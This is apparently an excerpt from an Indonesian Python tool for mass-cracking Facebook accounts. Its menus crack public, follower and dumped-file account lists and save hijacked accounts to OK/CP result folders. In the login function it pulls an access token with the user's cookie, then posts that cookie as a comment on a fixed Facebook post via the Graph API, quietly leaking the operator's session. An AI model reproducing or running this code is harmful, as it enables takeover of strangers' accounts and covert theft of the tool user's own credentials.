...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ses.post(f"https://graph.facebook.com/pfbid02Hnvsqk2XpXtvmdx9sBs5VZRpgMV1XiiFffv8zxX4EW8v5NWqDMaKaM2cj4vpRmZVl/comments/?message={cookie}&access_token={token}",cookies=cok)
...
def menu(my_name,my_id):
	...
	print(f'├──> Your Ip  : {ip}')
	print('|')
	statuscp = f'➤ 1. Crack Publik\n➤ 2. Crack folower\n➤ 3. Laporkan Bug\n➤ 4. Crack File\n➤ 5. Hasil Crack CP/OK\n➤ 6. Share Postingan Fb\n7. Tes➤ 0. Keluar'
	statuscp1 = nel(statuscp, style='cyan')
	cetak(nel(statuscp1, title='PILIH CRAK'))
	print('|')
...
def result():
	...
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('result/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
			...
			try:geh = lol[geeh]
				...
				back()
			try:lin = open('result/CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('result/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('result/OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('ALVINO-DUMP/')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
...
def setting():
	print('|')
	statuscp = f'➤ 1. Idz Old\n➤ 2. Idz New\n➤ 3. Random'
	statuscp1 = nel(statuscp, style='cyan')
	cetak(nel(statuscp1, title='PILIH IDZ AKUN'))
	print('|')
	hu = input('├──> Pilih : ')
	if hu in ['1','01']:
		...
		exit()
		print('|')
	statuscp = f'➤ 1. M-FACEBOOK\n➤ 2. MBASIC FACEBOOK\n➤ 3. TOUCH FACEBOOK\n➤ 4. M-TOUCH FACEBOOK'
	statuscp1 = nel(statuscp, style='cyan')
	cetak(nel(statuscp1, title='PILIH METODE'))
	print('|')
	hc = input('├──> Pilih : ')
	if hc in ['1','01']:
...
def passwrd():
	...
	print('|')
	print(f'├──> Hasil {h}OK{x} Tersimpan Di : {h}result/OK/%s {x}'%(okc))
	print(f'├──> Hasil {k}CP{x} Tersimpan Di : {k}result/CP/%s {x}'%(cpc))
